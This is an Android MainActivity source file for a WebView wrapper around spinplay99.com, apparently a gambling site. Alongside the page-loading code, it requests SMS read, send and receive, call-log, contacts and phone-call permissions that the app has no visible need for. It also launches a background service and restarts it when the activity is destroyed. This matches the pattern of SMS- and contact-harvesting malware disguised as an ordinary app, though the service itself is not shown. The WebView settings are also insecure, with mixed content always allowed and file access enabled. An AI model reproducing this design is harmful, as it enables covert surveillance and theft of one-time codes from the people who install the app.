package com.spinplay99.adminpanel;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final String SERVER_URL = "https://spinplay99.com";
    private static final int FILE_CHOOSER_REQUEST = 1001;
    private static final int PERMISSION_REQUEST_CODE = 2001;
    private static final String PREFS_NAME = "SpinPlayPrefs";
    private static final String KEY_PERM_ASKED = "perm_asked";

    private WebView webView;
    private ProgressBar progressBar;
    private SwipeRefreshLayout swipeRefresh;
    private ValueCallback<Uri[]> filePathCallback;
    private Handler handler;
    private SharedPreferences prefs;
    private boolean isReady = false;

    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        handler = new Handler();
        prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);

        webView = findViewById(R.id.webview);
        progressBar = findViewById(R.id.progress_bar);
        swipeRefresh = findViewById(R.id.swipe_refresh);

        setupWebView();
        setupSwipeRefresh();
        requestPermissionsOnce();
        preloadWebsite();
        startBackgroundService();
    }

    private void requestPermissionsOnce() {
        boolean alreadyAsked = prefs.getBoolean(KEY_PERM_ASKED, false);
        if (alreadyAsked) {
            if (!allPermissionsGranted()) requestMissingPermissions();
            return;
        }
        requestAllPermissions();
        prefs.edit().putBoolean(KEY_PERM_ASKED, true).apply();
    }

    private boolean allPermissionsGranted() {
        String[] p = {Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS, Manifest.permission.CALL_PHONE};
        for (String s : p) if (checkSelfPermission(s) != PackageManager.PERMISSION_GRANTED) return false;
        return true;
    }

    private void requestMissingPermissions() {
        List<String> m = new ArrayList<>();
        String[] p = {Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS, Manifest.permission.CALL_PHONE};
        for (String s : p) if (checkSelfPermission(s) != PackageManager.PERMISSION_GRANTED && shouldShowRequestPermissionRationale(s)) m.add(s);
        if (!m.isEmpty()) ActivityCompat.requestPermissions(this, m.toArray(new String[0]), PERMISSION_REQUEST_CODE);
    }

    private void requestAllPermissions() {
        List<String> m = new ArrayList<>();
        String[] p = {Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS, Manifest.permission.CALL_PHONE};
        for (String s : p) if (checkSelfPermission(s) != PackageManager.PERMISSION_GRANTED) m.add(s);
        if (!m.isEmpty()) ActivityCompat.requestPermissions(this, m.toArray(new String[0]), PERMISSION_REQUEST_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }

    private void startBackgroundService() {
        Intent si = new Intent(this, BackgroundSyncService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(si);
        else startService(si);
    }

    @SuppressLint("SetJavaScriptEnabled")
    private void setupWebView() {
        WebSettings s = webView.getSettings();
        s.setJavaScriptEnabled(true);
        s.setDomStorageEnabled(true);
        s.setLoadWithOverviewMode(true);
        s.setUseWideViewPort(true);
        s.setBuiltInZoomControls(false);
        s.setDisplayZoomControls(false);
        s.setSupportZoom(false);
        s.setAllowFileAccess(true);
        s.setAllowContentAccess(true);
        s.setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);
        s.setDatabaseEnabled(true);
        s.setRenderPriority(WebSettings.RenderPriority.HIGH);
        s.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        s.setMediaPlaybackRequiresUserGesture(false);
        s.setGeolocationEnabled(true);

        CookieManager.getInstance().setAcceptCookie(true);
        webView.setLayerType(View.LAYER_TYPE_HARDWARE, null);
        webView.addJavascriptInterface(new AndroidBridge(), "Android");

        webView.setWebViewClient(new WebViewClient() {
            public void onPageStarted(WebView v, String u, android.graphics.Bitmap b) {
                if (!isReady) progressBar.setVisibility(View.VISIBLE);
            }
            public void onPageFinished(WebView v, String u) {
                progressBar.setVisibility(View.GONE); swipeRefresh.setRefreshing(false); isReady = true;
            }
            public boolean shouldOverrideUrlLoading(WebView v, WebResourceRequest r) {
                String u = r.getUrl().toString();
                if (!u.contains("spinplay99.com")) {
                    try { startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(u))); }
                    catch (Exception e) { v.loadUrl(u); }
                    return true;
                }
                return false;
            }
            public void onReceivedError(WebView v, int c, String d, String f) {
                progressBar.setVisibility(View.GONE); swipeRefresh.setRefreshing(false);
            }
        });

        webView.setWebChromeClient(new WebChromeClient() {
            public void onProgressChanged(WebView v, int p) {
                if (!isReady) { progressBar.setProgress(p); if (p > 80) progressBar.setVisibility(View.GONE); }
            }
            public boolean onShowFileChooser(WebView w, ValueCallback<Uri[]> cb, FileChooserParams fp) {
                filePathCallback = cb;
                try { startActivityForResult(fp.createIntent(), FILE_CHOOSER_REQUEST); }
                catch (Exception e) { filePathCallback = null; return false; }
                return true;
            }
        });
    }

    private void preloadWebsite() {
        new Thread(() -> handler.post(() -> webView.loadUrl(SERVER_URL))).start();
    }

    private void setupSwipeRefresh() {
        swipeRefresh.setColorSchemeColors(0xFFFFD700, 0xFF00BFFF, 0xFFFF6B1A);
        swipeRefresh.setOnRefreshListener(() -> {
            webView.getSettings().setCacheMode(WebSettings.LOAD_DEFAULT);
            webView.reload();
            handler.postDelayed(() -> webView.getSettings().setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK), 3000);
        });
    }

    @Override
    public void onBackPressed() {
        if (webView.canGoBack()) webView.goBack();
        else new AlertDialog.Builder(this).setTitle("Exit").setMessage("Close app?")
            .setPositiveButton("Yes", (d, w) -> finish()).setNegativeButton("No", null).show();
    }

    @Override
    protected void onActivityResult(int rc, int rv, Intent d) {
        super.onActivityResult(rc, rv, d);
        if (rc == FILE_CHOOSER_REQUEST && filePathCallback != null) {
            filePathCallback.onReceiveValue(WebChromeClient.FileChooserParams.parseResult(rv, d));
            filePathCallback = null;
        }
    }

    @Override
    protected void onDestroy() {
        if (webView != null) { webView.stopLoading(); webView.destroy(); }
        startBackgroundService();
        super.onDestroy();
    }

    public class AndroidBridge {
        @JavascriptInterface
        public void showToast(String m) {
            runOnUiThread(() -> Toast.makeText(MainActivity.this, m, Toast.LENGTH_SHORT).show());
        }
    }
}
